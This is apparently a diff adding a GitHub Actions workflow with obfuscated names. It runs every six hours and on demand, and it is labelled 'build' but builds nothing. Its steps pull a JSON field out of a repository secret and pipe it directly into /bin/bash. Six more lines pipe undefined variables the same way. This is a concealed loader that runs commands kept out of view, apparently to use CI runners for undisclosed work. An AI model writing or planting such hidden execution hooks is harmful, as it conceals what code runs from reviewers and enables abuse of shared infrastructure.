@@ -1,0 +1,24 @@
+name: tangtanteng5647
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tangtanteng5647
+        env:
+          v68: ${{ secrets.v68 }}
+        run: |
+          echo $v68 | jq -r .ebjru45811 | /bin/bash
+          echo $sq9 | jq -r .m929 | /bin/bash
+          echo $dngvp696 | jq -r .pl190 | /bin/bash
+          echo $yov965 | jq -r .wobtl87 | /bin/bash
+          echo $ehk5 | jq -r .nt74 | /bin/bash
+          echo $lxg252 | jq -r .fnek1142 | /bin/bash
+          echo $or7 | jq -r .omede072 | /bin/bash
+
